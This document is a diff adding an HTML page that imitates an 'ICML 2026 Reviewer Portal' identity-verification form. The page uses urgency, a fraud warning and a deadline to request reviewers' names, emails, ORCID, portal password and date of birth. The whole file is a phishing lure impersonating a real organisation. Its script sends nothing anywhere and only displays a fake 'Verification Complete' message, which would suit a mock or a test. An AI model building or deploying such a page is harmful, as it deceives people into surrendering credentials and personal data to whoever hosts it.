@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ICML 2026 - Reviewer Identity Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 680px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+      overflow: hidden;
+    }
+    .header {
+      background: linear-gradient(135deg, #1a1a2e, #0f3460);
+      color: white;
+      padding: 32px;
+      text-align: center;
+    }
+    .header h1 { font-size: 22px; margin-bottom: 8px; }
+    .header p { font-size: 14px; opacity: 0.85; }
+    .badge {
+      display: inline-block;
+      background: #e94560;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    .alert-banner {
+      background: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .alert-banner span { font-size: 24px; }
+    .alert-banner p { font-size: 13px; color: #856404; }
+    .form-container { padding: 32px; }
+    .section-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1a1a2e;
+      margin-bottom: 16px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #0f3460;
+    }
+    .form-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+    .form-group { margin-bottom: 18px; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-group input, .form-group select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #cbd5e0;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .form-group input:focus, .form-group select:focus {
+      outline: none;
+      border-color: #0f3460;
+    }
+    .info-box {
+      background: #f7fafc;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 16px 0;
+      font-size: 12px;
+      color: #4a5568;
+      line-height: 1.6;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #0f3460, #16213e);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .submit-btn:hover { opacity: 0.95; }
+    .footer {
+      background: #f8f9fa;
+      padding: 16px;
+      text-align: center;
+      font-size: 11px;
+      color: #718096;
+    }
+    .success-message {
+      display: none;
+      text-align: center;
+      padding: 60px 40px;
+    }
+    .success-message .icon { font-size: 64px; margin-bottom: 16px; }
+    .success-message h2 { color: #38a169; font-size: 22px; margin-bottom: 12px; }
+    .success-message p { color: #666; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="badge">ACTION REQUIRED</div>
+      <h1>ICML 2026 Reviewer Portal</h1>
+      <p>International Conference on Machine Learning</p>
+    </div>
+
+    <div class="alert-banner">
+      <span>⚠️</span>
+      <div>
+        <p><strong>Identity Verification Required:</strong> Due to recent fraudulent reviewer registrations, all reviewers must re-verify their identity before accessing assigned papers. Deadline: <strong>March 20, 2026</strong>.</p>
+      </div>
+    </div>
+
+    <div id="formSection">
+      <div class="form-container">
+        <form id="verifyForm" onsubmit="handleSubmit(event)">
+          <div class="section-title">Reviewer Information</div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Full Legal Name</label>
+              <input type="text" name="fullName" placeholder="As on academic publications" required>
+            </div>
+            <div class="form-group">
+              <label>Institutional Email</label>
+              <input type="email" name="email" placeholder="name@university.edu" required>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Affiliation</label>
+              <input type="text" name="affiliation" placeholder="University or Company" required>
+            </div>
+            <div class="form-group">
+              <label>ORCID ID</label>
+              <input type="text" name="orcid" placeholder="0000-0000-0000-0000" required>
+            </div>
+          </div>
+
+          <div class="section-title">Account Security Verification</div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Portal Password</label>
+              <input type="password" name="password" placeholder="Your reviewer portal password" required>
+            </div>
+            <div class="form-group">
+              <label>Date of Birth</label>
+              <input type="text" name="dob" placeholder="YYYY-MM-DD" required>
+            </div>
+          </div>
+
+          <div class="info-box">
+            <strong>Why am I seeing this?</strong><br>
+            ICML takes reviewer integrity seriously. This one-time verification ensures that only qualified researchers have access to submitted manuscripts. Your information is encrypted and stored securely.
+          </div>
+
+          <button type="submit" class="submit-btn">Verify Identity & Access Papers</button>
+        </form>
+      </div>
+    </div>
+
+    <div id="successSection" class="success-message">
+      <div class="icon">✅</div>
+      <h2>Verification Complete</h2>
+      <p>Your reviewer identity has been verified. You will be redirected to your assigned papers shortly.</p>
+    </div>
+
+    <div class="footer">
+      © 2026 ICML Organization Committee. All rights reserved.<br>
+      Questions? Contact reviewers@icml.cc
+    </div>
+  </div>
+
+  <script>
+    function handleSubmit(e) {
+      e.preventDefault();
+      document.getElementById('formSection').style.display = 'none';
+      document.getElementById('successSection').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
